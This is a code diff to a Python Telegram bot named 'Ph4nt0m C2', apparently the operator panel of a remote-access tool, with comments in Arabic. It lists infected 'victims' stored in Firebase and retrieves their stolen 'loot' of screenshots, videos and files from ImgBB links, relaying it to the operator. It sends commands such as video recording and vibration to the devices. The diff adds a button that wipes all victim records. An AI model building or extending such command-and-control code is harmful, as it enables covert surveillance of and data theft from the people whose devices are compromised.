@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """
-Ph4nt0m Telegram C2 - ImgBB Edition
-يستخدم ImgBB لرفع الصور والملفات.
+Ph4nt0m Telegram C2 - ImgBB Edition + Bulk Delete
 """
-import os, json, base64, threading, requests
+import os, json, threading, requests
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
@@ -22,7 +21,7 @@ def run_flask():
 # ---------- إعدادات Firebase و ImgBB ----------
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 FIREBASE_URL = os.environ["FIREBASE_URL"]
-IMGBB_API_KEY = os.environ["IMGBB_API_KEY"]
+IMGBB_API_KEY = os.environ.get("IMGBB_API_KEY", "")  # احتياطي
 
 firebase_creds = os.environ.get("FIREBASE_CREDS")
 if firebase_creds:
@@ -32,7 +31,7 @@ else:
     initialize_app(options={'databaseURL': FIREBASE_URL})
 
 victims_ref = db.reference('victims')
-current_victim = {}
+current_victim = {}  # user_id -> victim_id
 
 def get_online_victims():
     snap = victims_ref.get()
@@ -40,7 +39,6 @@ def get_online_victims():
     return {k:v for k,v in snap.items() if v.get('online')}
 
 async def send_file_from_url(update, url, filename, caption):
-    """تحميل الملف من ImgBB وإرساله إلى تيليجرام"""
     try:
         response = requests.get(url)
         if response.status_code == 200:
@@ -58,7 +56,11 @@ def get_victims_keyboard():
         fg = info.get('fingerprint', {})
         label = f"🖥 {vid} ({fg.get('plat','?')})"
         keyboard.append([InlineKeyboardButton(label, callback_data=f'select_{vid}')])
-    keyboard.append([InlineKeyboardButton("🔄 تحديث القائمة", callback_data='refresh_victims')])
+    # صف الإجراءات العامة
+    keyboard.append([
+        InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims'),
+        InlineKeyboardButton("🗑️ مسح الكل", callback_data='delete_all_victims')
+    ])
     return InlineKeyboardMarkup(keyboard)
 
 def get_control_keyboard():
@@ -76,6 +78,7 @@ def get_control_keyboard():
     ]
     return InlineKeyboardMarkup(keyboard)
 
+# ---------- الأوامر ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "⚡ **Ph4nt0m C2 Bot**\n\nاختر زر 'عرض الضحايا' للتحكم.",
@@ -90,11 +93,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = query.from_user.id
     data = query.data
 
-    if data == 'show_victims' or data == 'back_to_victims' or data == 'refresh_victims':
+    # --- عرض القائمة أو رجوع ---
+    if data in ('show_victims', 'back_to_victims', 'refresh_victims'):
         vics = get_online_victims()
         if not vics:
             await query.edit_message_text("لا توجد أجهزة متصلة حالياً.", reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims')]
+                [InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims')],
+                [InlineKeyboardButton("🗑️ مسح الكل", callback_data='delete_all_victims')]
             ]))
             return
         txt = "📟 **الضحايا المتصلين:**\nاختر جهازاً للتحكم."
@@ -102,6 +107,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if current_victim.get(uid): del current_victim[uid]
         return
 
+    # --- مسح جميع الأجهزة ---
+    if data == 'delete_all_victims':
+        # حذف جميع عقد victims من القاعدة
+        victims_ref.delete()
+        # مسح الجلسة الحالية للمستخدم الحالي
+        if current_victim.get(uid): del current_victim[uid]
+        await query.edit_message_text("🗑️ **تم مسح جميع الأجهزة والجلسات بنجاح.**", reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
+        ]))
+        return
+
+    # --- اختيار ضحية ---
     if data.startswith('select_'):
         vid = data.replace('select_', '')
         vics = get_online_victims()
@@ -114,19 +131,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(txt, reply_markup=get_control_keyboard())
         return
 
+    # --- التحقق من وجود جلسة ---
     vid = current_victim.get(uid)
     if not vid:
         await query.edit_message_text("انتهت الجلسة. اختر ضحية من جديد:", reply_markup=get_victims_keyboard())
         return
 
+    # --- مسح جلسة جهاز محدد ---
     if data == 'leave':
-        victims_ref.child(vid).remove()
+        # حذف الجهاز من قاعدة البيانات
+        victims_ref.child(vid).delete()
+        # إزالة الجلسة من ذاكرة المستخدم
         if current_victim.get(uid) == vid: del current_victim[uid]
-        await query.edit_message_text("🚫 تم مسح الجلسة وفصل الجهاز.", reply_markup=InlineKeyboardMarkup([
+        await query.edit_message_text("🚫 **تم مسح الجلسة والجهاز بالكامل.**", reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
         ]))
         return
 
+    # --- عرض المسروقات ---
     if data == 'loot':
         loot = db.reference(f'victims/{vid}/loot').get()
         if not loot:
@@ -139,13 +161,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             name = item.get('name', typ)
             url = item.get('url')
             if url and typ in ('screenshot','video','file'):
-                # نرسل الملف من ImgBB إلى تيليجرام
-                await send_file_from_url(query, url, f"{name}.{'png' if typ=='screenshot' else 'webm' if typ=='video' else ''}", f"📎 {name}")
+                ext = 'png' if typ=='screenshot' else 'webm' if typ=='video' else ''
+                await send_file_from_url(query, url, f"{name}.{ext}", f"📎 {name}")
             else:
                 await query.message.reply_text(f"[{typ}] {name} - لا يوجد رابط.")
         return
 
-    # الأوامر التنفيذية
+    # --- الأوامر التنفيذية ---
     params = {}
     if data == 'vibrate': params['duration'] = 5000
     elif data == 'record_video': params['duration'] = 10
@@ -154,6 +176,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     db.reference(f'victims/{vid}/command').set(cmd)
     await query.edit_message_text(f"✅ تم إرسال الأمر: {data}\nالجهاز: `{vid}`", reply_markup=get_control_keyboard())
 
+# ---------- بدء التشغيل ----------
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
